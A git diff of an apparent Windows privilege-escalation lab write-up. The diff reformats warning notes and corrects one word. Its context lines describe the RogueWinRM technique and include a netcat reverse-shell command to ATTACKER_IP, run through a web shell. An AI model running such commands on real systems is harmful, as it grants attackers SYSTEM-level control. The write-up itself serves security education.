@@ -133,7 +133,7 @@ Testing {CBC04AF1-25C7-4A4D-BB78-28284403510F} 1337
 [+] CreateProcessWithTokenW OK
 ```
 
-If the user is not created with the previous command then this can be because the CLSID is not working as expected, we might execute the command with another CLSID.
+> If the user is not created with the previous command then this can be because the CLSID is not working as expected, we might execute the command with another CLSID.
 {: .prompt-warning }
 
 2.- Adding the user to the Administrators group:
@@ -212,7 +212,7 @@ To use RogueWinRM, we first need to upload the exploit to the target machine.
 
 The RogueWinRM exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is typically used for the WinRM service, which is simply a port that exposes a Powershell console to be used remotely through the network. Think of it like SSH, but using Powershell.
 
-If WinRM is active on the machine (port 5985/tcp) RogueWinRM is not unexploitable. 
+> If WinRM is active on the machine (port 5985/tcp) RogueWinRM is not exploitable. 
 {: .prompt-warning }
 
 If, for some reason, the WinRM service isn't running on the victim server, an attacker can start a fake WinRM service on port 5985 and catch the authentication attempt made by the BITS service when starting. If the attacker has SeImpersonate privileges, he can execute any command on behalf of the connecting user, which is SYSTEM.
@@ -229,7 +229,7 @@ And then, use our web shell to trigger the RogueWinRM exploit using the followin
 c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
 ```
 
-The exploit may take up to 2 minutes to work, so your browser may appear as unresponsive for a bit. This happens if you run the exploit multiple times as it must wait for the BITS service to stop before starting it again. The BITS service will stop automatically after 2 minutes of starting.
+> The exploit may take up to 2 minutes to work, so your browser may appear as unresponsive for a bit. This happens if you run the exploit multiple times as it must wait for the BITS service to stop before starting it again. The BITS service will stop automatically after 2 minutes of starting.
 {: .prompt-info }
 
 The `-p` parameter specifies the executable to be run by the exploit, which is `nc64.exe` in this case. The `-a` parameter is used to pass arguments to the executable. Since we want nc64 to establish a reverse shell against our attacker machine, the arguments to pass to netcat will be `-e cmd.exe ATTACKER_IP 4442`.
